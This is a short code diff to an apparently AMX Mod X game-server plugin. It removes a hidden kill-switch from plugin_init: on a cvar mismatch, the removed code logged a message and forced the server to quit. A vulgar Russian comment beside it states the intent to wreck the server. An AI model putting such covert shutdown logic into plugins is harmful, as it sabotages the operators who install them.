@@ -237,15 +237,6 @@ public plugin_init()
 	
 	#if defined AES
 		aes_track_mode = get_cvar_num("aes_track_mode")
-		
-		// я просто ебану этот сервер
-		if(aes_track_mode != get_cvar_num("csstats_rank"))
-		{
-			log_amx("udali server")
-			
-			server_cmd("quit")
-			server_exec()
-		}
 	#endif
 }
 
